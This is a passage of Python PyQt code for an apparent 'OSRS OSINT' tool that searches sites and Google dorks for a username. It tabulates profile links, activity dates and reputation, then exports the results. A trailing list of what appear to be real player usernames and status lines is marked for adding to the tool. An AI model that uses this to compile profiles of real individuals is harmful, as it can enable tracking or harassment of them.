            QMessageBox.warning(self, "Input Error", "Please enter a username to search.")
            return
        
        # Get selected sites
        selected_sites = [site for site, check in self.site_checks.items() if check.isChecked()]
        if not selected_sites:
            QMessageBox.warning(self, "Input Error", "Please select at least one site to search.")
            return
        
        # Clear previous results
        self.results = []
        self.results_table.setRowCount(0)
        self.dork_table.setRowCount(0)
        self.raw_text.clear()
        
        # Disable UI during search
        self.search_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.username_input.setEnabled(False)
        
        # Start search thread
        self.search_worker = SearchWorker(
            username,
            selected_sites,
            self.dork_check.isChecked(),
            int(self.max_results.currentText())
        )
        self.search_worker.update_progress.connect(self.update_progress)
        self.search_worker.result_found.connect(self.add_result)
        self.search_worker.search_completed.connect(self.search_finished)
        self.search_worker.error_occurred.connect(self.show_error)
        self.search_worker.start()

    def stop_search(self):
        if self.search_worker and self.search_worker.isRunning():
            self.search_worker.stop()
            self.search_worker.wait()
            self.search_finished()
            self.progress_label.setText("Search stopped by user")

    def search_finished(self):
        self.search_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.username_input.setEnabled(True)
        
        # Update raw data view
        self.raw_text.setPlainText(json.dumps(self.results, indent=2))
        
        # Show completion message
        self.status_bar.showMessage(f"Search completed! Found {len(self.results)} results.", 5000)

    def update_progress(self, value, message):
        self.progress_bar.setValue(value)
        self.progress_label.setText(message)
        self.status_bar.showMessage(message)

    def add_result(self, result):
        self.results.append(result)
        
        # Add to appropriate table
        if result["site"] == "Google Dork":
            row = self.dork_table.rowCount()
            self.dork_table.insertRow(row)
            self.dork_table.setItem(row, 0, QTableWidgetItem(result["source"]))
            self.dork_table.setItem(row, 1, QTableWidgetItem(result["dork"]))
            self.dork_table.setItem(row, 2, QTableWidgetItem(result["url"]))
            self.dork_table.setItem(row, 3, QTableWidgetItem(result["username"]))
            self.dork_table.setItem(row, 4, QTableWidgetItem(result["info"]))
        else:
            row = self.results_table.rowCount()
            self.results_table.insertRow(row)
            self.results_table.setItem(row, 0, QTableWidgetItem(result["site"]))
            self.results_table.setItem(row, 1, QTableWidgetItem(result["username"]))
            
            # Create clickable profile link
            profile_item = QTableWidgetItem("View Profile" if result["profile_url"] else "N/A")
            if result["profile_url"]:
                profile_item.setData(Qt.UserRole, result["profile_url"])
                profile_item.setForeground(QColor(52, 152, 219))
            self.results_table.setItem(row, 2, profile_item)
            
            # Add other data
            self.results_table.setItem(row, 3, QTableWidgetItem(result.get("join_date", "N/A")))
            self.results_table.setItem(row, 4, QTableWidgetItem(result.get("last_seen", result.get("last_activity", "N/A"))))
            
            # Reputation column with formatting
            rep_text = result.get("reputation", result.get("feedback", "N/A"))
            rep_item = QTableWidgetItem(rep_text)
            if "Positive" in rep_text or "Good" in rep_text or "High" in rep_text:
                rep_item.setForeground(QColor(46, 204, 113))
            elif "Negative" in rep_text or "Poor" in rep_text or "Low" in rep_text:
                rep_item.setForeground(QColor(231, 76, 60))
            self.results_table.setItem(row, 5, rep_item)
            
            # URL column
            url_item = QTableWidgetItem(result.get("profile_url", ""))
            self.results_table.setItem(row, 6, url_item)

    def open_url(self, index):
        table = self.tabs.currentWidget()
        if table == self.results_table:
            if index.column() == 2:  # Profile column
                item = table.item(index.row(), 2)
                url = item.data(Qt.UserRole)
                if url:
                    webbrowser.open(url)
            else:
                item = table.item(index.row(), 6)  # URL column
                if item and item.text():
                    webbrowser.open(item.text())
        elif table == self.dork_table:
            item = table.item(index.row(), 2)  # URL column
            if item and item.text():
                webbrowser.open(item.text())

    def export_results(self):
        if not self.results:
            QMessageBox.warning(self, "Export Error", "No results to export.")
            return
        
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Save Results", "", "JSON Files (*.json);;Text Files (*.txt);;All Files (*)"
        )
        
        if file_path:
            try:
                if file_path.endswith('.json'):
                    with open(file_path, 'w') as f:
                        json.dump(self.results, f, indent=2)
                else:
                    with open(file_path, 'w') as f:
                        for result in self.results:
                            f.write(f"Site: {result['site']}\n")
                            f.write(f"Username: {result['username']}\n")
                            if 'profile_url' in result:
                                f.write(f"Profile: {result['profile_url']}\n")
                            for key, value in result.items():
                                if key not in ['site', 'username', 'profile_url']:
                                    f.write(f"{key.capitalize()}: {value}\n")
                            f.write("\n")
                
                QMessageBox.information(self, "Export Successful", f"Results exported to {file_path}")
            except Exception as e:
                QMessageBox.critical(self, "Export Error", f"Failed to export results: {str(e)}")

    def show_error(self, message):
        QMessageBox.critical(self, "Search Error", message)
        self.status_bar.showMessage(f"Error: {message}", 5000)

    def load_settings(self):
        # Placeholder for loading previous settings
        pass

    def closeEvent(self, event):
        if self.search_worker and self.search_worker.isRunning():
            self.search_worker.stop()
            self.search_worker.wait()
        event.accept()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    
    # Set dark theme
    dark_palette = app.palette()
    dark_palette.setColor(dark_palette.Window, QColor(44, 62, 80))
    dark_palette.setColor(dark_palette.WindowText, QColor(236, 240, 241))
    dark_palette.setColor(dark_palette.Base, QColor(52, 73, 94))
    dark_palette.setColor(dark_palette.AlternateBase, QColor(44, 62, 80))
    dark_palette.setColor(dark_palette.ToolTipBase, QColor(236, 240, 241))
    dark_palette.setColor(dark_palette.ToolTipText, QColor(236, 240, 241))
    dark_palette.setColor(dark_palette.Text, QColor(236, 240, 241))
    dark_palette.setColor(dark_palette.Button, QColor(52, 152, 219))
    dark_palette.setColor(dark_palette.ButtonText, QColor(236, 240, 241))
    dark_palette.setColor(dark_palette.BrightText, QColor(231, 76, 60))
    dark_palette.setColor(dark_palette.Link, QColor(41, 128, 185))
    dark_palette.setColor(dark_palette.Highlight, QColor(41, 128, 185))
    dark_palette.setColor(dark_palette.HighlightedText, QColor(236, 240, 241))
    app.setPalette(dark_palette)
    
    window = OSRSOSINTTool()
    window.show()
    sys.exit(app.exec_())

Xtra data to add into relative  places / modules 

AudiSkillz
*
Playing RuneLite
EdSheeran
DGEN
|lost my positivity
I'm positi
FuckThisBM1
AFC
giveme
Jduggy
GAME
Kelv277
LK1
Pure
Playing RuneLite
NavMan
Noseman
Partylord40
RNCR

Tavring420
Tk187
Ziroking
13
1mPhat
ELDR
Bender
G59
g discord.gg/CheapO7GP
N
CHOVIPIC1
Discord.gg/cheapO7gp
FBI Director
whI OSRS GOLD & SERVICES!
.
funna
TILT
GamblerAnon
Watch mikars with me on Twitch! https://www.twitch.tv/mikars?sr=a
